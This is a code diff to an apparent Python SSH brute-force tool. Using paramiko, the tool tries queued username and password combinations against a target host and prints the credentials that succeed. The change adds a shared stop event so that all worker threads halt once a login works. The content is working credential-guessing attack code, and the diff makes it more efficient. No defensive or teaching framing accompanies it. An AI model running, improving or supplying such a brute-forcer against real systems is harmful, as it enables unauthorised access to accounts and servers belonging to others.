@@ -2,7 +2,7 @@ import socket
 import paramiko
 import argparse
 
-from threading import Thread, Lock
+from threading import Thread, Lock, Event
 from queue import Queue
 
 combo_queue = Queue()
@@ -75,9 +75,15 @@ for userc in users:
 
 
 def ssh_worker():
+    if stop_event.is_set():
+        combo_queue.task_done()
+        return
+
     while not combo_queue.empty():
         user , password =  combo_queue.get()
         try:
+            if stop_event.is_set():
+                return
             client = paramiko.SSHClient()
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             client.connect(host,username=user, password=password, timeout=3)
@@ -85,6 +91,7 @@ def ssh_worker():
 
             with result_lock :
                 print(f"Success {user}  :   {password}")
+                stop_event.set()
             
             client.close()
 
